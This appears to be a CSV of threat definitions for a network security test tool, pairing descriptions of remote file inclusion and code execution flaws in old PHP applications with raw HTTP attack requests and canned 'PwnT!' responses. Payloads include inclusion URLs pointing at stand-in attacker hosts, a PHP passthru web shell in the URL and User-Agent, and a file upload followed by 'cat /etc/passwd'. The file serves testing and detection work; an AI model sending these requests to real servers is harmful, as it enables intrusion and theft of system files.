XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
phpraid_cmi_IPv6.xml,phpRaid Remote File Inclusion (IPv6 Version),"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpraid_cmi_b.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,"GET /phpbb/auth/auth.php?smf_root_path=http://www.yourcode.com/x.txt?&cmd=id HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
phpraid_cmi_b.xml,phpRaid Remote File Inclusion,"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpraid_cmi_b_IPv6.xml,phpRaid Remote File Inclusion (IPv6 Version),"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /phpbb/auth/auth.php?smf_root_path=http://www.yourcode.com/x.txt?&cmd=id HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
phpraid_cmi_b_IPv6.xml,phpRaid Remote File Inclusion (IPv6 Version),"This threat sends a crafted url containing a local or remote path to PHP or HTML via auth.php ""phpbb_root_path"" parameter which is included by the server allowing arbitrary remote code execution. phpRaid is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpwebsite_cmi.xml,PHPWebSite 0.10.2 Remote Command Execution,"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80.",HTTP,TCP,GET /phpwebsite/<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) [[0A ]]{$_GET[cmd]=striplashes($_GET[cmd]);}passthru($_GET[cmd]);echo 666;die;?> HTTP/1.1[[0D 0A ]]User-Agent: <?php ob_clean();echo 666;if (get_magic_quotes_gpc()) [[0A ]]{$_GET[cmd]=striplashes($_GET[cmd]);}passthru($_GET[cmd]);echo 666;die;?>[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
phpwebsite_cmi.xml,PHPWebSite 0.10.2 Remote Command Execution,"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿phpwebsite_cmi_IPv6.xml,PHPWebSite 0.10.2 Remote Command Execution (IPv6 Version),"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,GET /phpwebsite/<?php ob_clean();echo 666;if (get_magic_quotes_gpc()) [[0A ]]{$_GET[cmd]=striplashes($_GET[cmd]);}passthru($_GET[cmd]);echo 666;die;?> HTTP/1.1[[0D 0A ]]User-Agent: <?php ob_clean();echo 666;if (get_magic_quotes_gpc()) [[0A ]]{$_GET[cmd]=striplashes($_GET[cmd]);}passthru($_GET[cmd]);echo 666;die;?>[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: close[[0D 0A 0D 0A]]
phpwebsite_cmi_IPv6.xml,PHPWebSite 0.10.2 Remote Command Execution (IPv6 Version),"This threat simply builds a URL containing PHP code, as well as injecting code within the ""User-Agent"" header field which when combined with an arbitrary remote inclusion flaw allows the execution of arbitrary code. PHPWebSite is a web application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿quezza_cmi.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability.,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,"GET /quezza%2Fincludes%2Fclass_template.php%3Fquezza_root_path%3Dhttp%3A%2F%2F%5Battacker%5D%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
quezza_cmi.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability.,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿quezza_cmi_IPv6.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability. (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /quezza%2Fincludes%2Fclass_template.php%3Fquezza_root_path%3Dhttp%3A%2F%2F%5Battacker%5D%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
quezza_cmi_IPv6.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability. (IPv6 Version),This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿rsgallery_cmi.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability,"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80.",HTTP,TCP,"GET /joomlapath%2Fcomponents%2Fcom_rsgallery2%2Frsgallery.html.php%3FmosConfig_absolute_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
rsgallery_cmi.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability,"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿rsgallery_cmi_IPv6.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability (IPv6 Version),"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /joomlapath%2Fcomponents%2Fcom_rsgallery2%2Frsgallery.html.php%3FmosConfig_absolute_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
rsgallery_cmi_IPv6.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability (IPv6 Version),"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿runcms_cmi.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,"POST class/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]User-Agent: Sun-tzu giving you the pain[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Length: 194[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""NewFile""; filename=""suntzu8005.86630494448""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A 0D 0A ]]-----------------------------7d529a1d23092a--[[0D 0A 0D 0A 0D 0A ]]GET suntzu8005.86630494448?cmd= HTTP/1.1[[0D 0A ]]User-Agent: GoogleBot/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A 0D 0A 0D 0A ]]GET modules/newbb_plus/class/class.forumposts.php?cmd=&bbPath[path]= HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A 0D 0A 0D 0A ]]GET modules/newbb_plus/class/forumpollrenderer.php?cmd=&bbPath[path]=/&xoopsConfig[language]=suntzu HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A 0D 0A]]"
runcms_cmi.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿runcms_cmi_IPv6.xml,RunCMS Remote Code Execution Vulnerability (IPv6 Version),This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"POST class/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]User-Agent: Sun-tzu giving you the pain[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Length: 194[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""NewFile""; filename=""suntzu8005.86630494448""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A 0D 0A ]]-----------------------------7d529a1d23092a--[[0D 0A 0D 0A 0D 0A ]]GET suntzu8005.86630494448?cmd= HTTP/1.1[[0D 0A ]]User-Agent: GoogleBot/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A 0D 0A 0D 0A ]]GET modules/newbb_plus/class/class.forumposts.php?cmd=&bbPath[path]= HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A 0D 0A 0D 0A ]]GET modules/newbb_plus/class/forumpollrenderer.php?cmd=&bbPath[path]=/&xoopsConfig[language]=suntzu HTTP/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A 0D 0A]]"
runcms_cmi_IPv6.xml,RunCMS Remote Code Execution Vulnerability (IPv6 Version),This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿runcms_cmi_b.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,"POST editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1[[0D 0A ]]Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a[[0D 0A ]]User-Agent: Sun-tzu giving you the pain[[0D 0A ]]Host: www.example.com[[0D 0A ]]Content-Length: 194[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A ]]-----------------------------7d529a1d23092a[[0D 0A ]]Content-Disposition: form-data; name=""NewFile""; filename=""suntzu3423.18748782712""[[0D 0A ]]Content-Type:[[0D 0A 0D 0A 0D 0A ]]-----------------------------7d529a1d23092a--[[0D 0A 0D 0A 0D 0A ]]GET suntzu3423.18748782712?cmd=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]User-Agent: GoogleBot/1.1[[0D 0A ]]Host: www.example.com[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
